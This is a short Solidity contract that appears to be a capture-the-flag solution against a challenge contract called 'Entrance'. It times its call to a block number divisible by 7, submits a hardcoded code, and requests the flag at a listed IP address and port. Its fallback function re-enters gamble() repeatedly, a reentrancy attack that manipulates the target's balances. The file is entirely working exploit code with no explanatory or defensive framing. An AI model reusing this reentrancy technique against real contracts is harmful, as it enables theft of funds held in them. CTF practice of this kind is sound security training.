pragma solidity >=0.4.21 <0.6.0;

import "./Entrance.sol";
import "./SafeMath.sol";

contract EnterAgain {
    using SafeMath for *;

    uint256 counter = 0;
    address a;

    constructor(address _a) {
        a = _a;
    }

    function enter() {
        uint b = block.number;
        require((b).mod(7) == 0, "wrong block number");
        Entrance entrance = Entrance(a);
        entrance.enter(0xbc4f77);
        entrance.gamble();
        entrance.getFlag("34.254.178.181", "8080");
        //selfdestruct(0x0);
    }

    function() {
        Entrance entrance = Entrance(a);
        if(entrance.balances(this) <= 300) {
            entrance.gamble();
        }
    }
}
